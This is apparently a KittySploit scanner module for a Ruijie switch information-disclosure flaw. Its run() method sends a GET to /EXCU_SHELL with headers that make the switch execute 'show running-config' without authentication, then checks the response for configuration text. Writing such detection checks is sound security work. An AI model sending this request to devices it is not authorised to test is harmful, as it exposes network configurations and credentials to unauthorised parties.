#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially e."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure Detection',
        'description': 'Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'ruijie', 'switch', 'disclosure', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL',
            'https://github.com/ibaiw/2023Hvv/blob/main/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA%20WEB%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20EXCU_SHELL%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md',
        ],
    }

    def run(self):
        path = '/EXCU_SHELL'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cmdnum': "'1'", 'Command1': 'show running-config', 'Confirm1': 'n'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Building configuration', 'Current configuration',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure detected', path=path)
            return True
        return False

